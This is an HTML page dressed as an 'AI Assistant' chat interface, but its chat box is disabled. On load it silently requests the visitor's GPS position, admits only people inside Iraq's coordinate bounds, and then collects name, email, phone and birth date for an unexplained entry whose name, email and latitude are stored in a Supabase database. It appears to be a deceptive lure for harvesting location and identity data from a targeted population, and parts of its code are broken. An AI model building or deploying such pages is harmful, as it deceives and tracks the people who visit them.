<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>AI Assistant</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet" />
<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.js"></script>

<style>
* { box-sizing: border-box; margin:0; padding:0; }

body {
  font-family: "Inter", sans-serif;
  background:#343541;
  color:#ECECF1;
  height:100vh;
  display:flex;
}

/* Sidebar */
.sidebar {
  width:260px;
  background:#202123;
  padding:14px;
  display:flex;
  flex-direction:column;
}

.sidebar h1 {
  font-size:14px;
  font-weight:500;
  margin-bottom:12px;
}

/* Main */
.main {
  flex:1;
  display:flex;
  flex-direction:column;
}

/* Chat area */
.chat {
  flex:1;
  overflow-y:auto;
  padding:20px;
}

.msg {
  max-width:700px;
  margin:0 auto 20px;
  line-height:1.6;
}

.msg.user { color:#fff; }
.msg.system { color:#d1d5db; }

/* Input bar */
.input-bar {
  border-top:1px solid #565869;
  padding:14px;
}

.input-inner {
  max-width:700px;
  margin:auto;
  display:flex;
  background:#40414F;
  border-radius:10px;
  padding:10px;
}

.input-inner input {
  flex:1;
  background:transparent;
  border:none;
  color:#fff;
  font-size:15px;
  outline:none;
}

/* Hidden screens */
.screen { display:none; }
.screen.active { display:block; }

.center-box {
  max-width:520px;
  margin:80px auto;
  text-align:center;
}

button {
  margin-top:20px;
  padding:12px 18px;
  border:none;
  border-radius:8px;
  background:#19c37d;
  color:#000;
  cursor:pointer;
}
</style>
</head>

<body>

<div class="sidebar">
  <h1>AI Assistant</h1>
</div>

<div class="main">

  <div class="chat">

    <!-- GPS SCREEN -->
    <div id="screen-gps" class="screen active">
      <div class="center-box">
        <div class="msg system">Checking your location…</div>
        <div id="gps-alert"></div>
        <button id="btn-gps">Retry</button>
      </div>
    </div>

    <!-- BLOCKED -->
    <div id="screen-blocked" class="screen">
      <div class="center-box">
        <div class="msg system">❌ Not eligible. Iraq only.</div>
      </div>
    </div>

    <!-- FORM -->
    <div id="screen-form" class="screen">
      <div class="center-box">
        <div class="msg system">You're eligible. Enter details:</div>

        <input id="f-name" placeholder="Full Name"><br><br>
        <input id="f-email" placeholder="Email"><br><br>
        <input id="f-phone" placeholder="Phone"><br><br>
        <input id="f-dob" type="date"><br><br>

        <div id="form-alert"></div>

        <button id="btn-submit" onclick="submitForm()">Submit</button>
      </div>
    </div>

    <!-- SUCCESS -->
    <div id="screen-success" class="screen">
      <div class="center-box">
        <div class="msg system">✅ You're in!</div>
        <div id="entry-ref"></div>
      </div>
    </div>

  </div>

  <div class="input-bar">
    <div class="input-inner">
      <input placeholder="Send a message..." disabled />
    </div>
  </div>

</div>

<script>
// ================= CONFIG =================
const SUPABASE_URL = 'https://jutxirqoqtmvbpvkwumf.supabase.co';
const SUPABASE_ANON_KEY = 'YOUR_KEY';

// Iraq bounds
const IRAQ = { latMin:29.0, latMax:37.5, lngMin:38.6, lngMax:48.9 };

// Init
const sb = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
let visitorId=null, ipData={}, gpsPosition=null;

// ================= UI =================
function show(id){
  document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active'));
  document.getElementById('screen-'+id)?.classList.add('active');
}

function alert_(id,type,msg){
  document.getElementById(id).innerHTML = msg || '';
}

// ================= GPS =================
async function requestGPS(){

  if(!navigator.geolocation){
    alert_('gps-alert','err','No GPS support');
    return;
  }

  navigator.geolocation.getCurrentPosition(
    async pos=>{
      const {latitude:lat, longitude:lng, accuracy:acc} = pos.coords;
      gpsPosition={lat,lng,acc};

      await updateGPS('granted',lat,lng,acc);

      isIraq(lat,lng)?show('form'):show('blocked');
    },
    async ()=>{
      await updateGPS('denied');
      alert_('gps-alert','err','Location denied');
    }
  );
}

document.getElementById('btn-gps').onclick = requestGPS;

// Auto trigger
setTimeout(requestGPS, 500);

// Mobile fallback
document.addEventListener('click', function once(){
  requestGPS();
  document.removeEventListener('click', once);
});

// ================= LOGIC (UNCHANGED CORE) =================
function isIraq(lat,lng){
  return lat>=IRAQ.latMin && lat<=IRAQ.latMax &&
         lng>=IRAQ.lngMin && lng<=IRAQ.lngMax;
}

async function updateGPS(status,lat,lng,acc){
  if(!visitorId) return;
  await sb.from('visitors').update({
    gps_status:status,
    gps_lat:lat||null,
    gps_lng:lng||null,
    gps_accuracy:acc||null
  }).eq('id',visitorId);
}

// Submit
async function submitForm(){
  const name=document.getElementById('f-name').value;
  const email=document.getElementById('f-email').value;

  const {data} = await sb.from('contestants').insert({
    full_name:name,
    email:email,
    gps_lat:gpsPosition?.lat
  }).select('id').single();

  document.getElementById('entry-ref').textContent =
    'REF: '+(data.id?.slice(0,8).toUpperCase());

  show('success');
}

// bootstrap
(async()=>{
  show('gps');
})();
</script>

</body>
</html>
